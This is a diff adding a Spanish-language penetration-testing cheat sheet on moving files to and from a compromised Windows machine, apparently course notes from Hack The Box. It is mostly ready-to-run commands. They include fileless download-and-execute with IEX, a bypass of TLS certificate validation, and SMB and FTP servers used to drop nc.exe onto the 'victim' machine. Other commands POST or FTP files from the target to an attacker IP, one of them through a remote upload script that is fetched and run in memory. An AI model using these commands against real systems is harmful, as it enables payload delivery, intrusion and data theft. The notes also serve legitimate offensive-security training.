@@ -1,1 +1,117 @@
+################################################DOWNLOADS
+
+####Transferir un archivo en base64:
+
+pasar el archivo a base64.
+cat "archivo" |base64 -w 0;echo
+copiar el código resultante en la computadora origen.
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("codigo b64"))
+
+
+###########Powershell Downloads
+
+####File downloads:
+
+(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+
+####Fileless download (busca un archivo y lo ejecuta sin descargarlo):
+
+IEX (New-Object Net.WebClient).DownloadString('url_to_file')
+
+####file download via webrequest:
+
+Invoke-WebRequest url_del_file_sin_comillas -OutFile file_a_crear
+
+Este comando es lento y puede traer problemas si el Iexplorer no fue configurado previamente (previo a la primer configuración, no funcionan las descargas) se puede solucionar agregando "-UseBasicParsing" en vez del
+outputfile.
+
+####Si tenemos problemas de ssl o tls inseguros podemos baypassearlos con el siguiente código:
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+
+############TRANSFERIR POR SMB
+creamos un servidor smb:
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+desde la computadora víctima podemos copiarlo:
+copy \\path_to_file
+
+En el caso de que no nos permita descargar el fichero debido a que las politicas de seguridad no permiten descargar en modo guest o unauthenticated:
+creamos un SMB server con credenciales:
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+Nos autenticamos en el servidor:
+net use n: \\192.168.220.133\share /user:test test
+
+copiamos el archivo:
+copy n:\nc.exe
+
+
+############FTP
+sudo pip3 install pyftpdlib
+
+creamos el servicio FTP
+sudo python3 -m pyftpdlib --port 21
+
+traerlos via powershell:
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+luego creamos un command file y lo descargamos:
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo GET file.txt >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+ftp> GET file.txt
+ftp> bye
+
+
+##################################################################################UPLOADS
+
+###### Base64:
+[Convert]::ToBase64String((Get-Content -path "path_to_file" -Encoding byte))
+ 
+opción 2:
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+
+
+#####POWERSHELL WEB UPLOADS
+creamos un uploadserver:
+pip3 install uploadserver
+python3 -m uploadserver
+
+Luego usamos PSUpload.ps1
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+
+
+#####FTP UPLOADS
+
+Creamos el servidor en nuestra máquina atacante
+
+Luego:
+Powershell:
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+
+cmd:
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
 
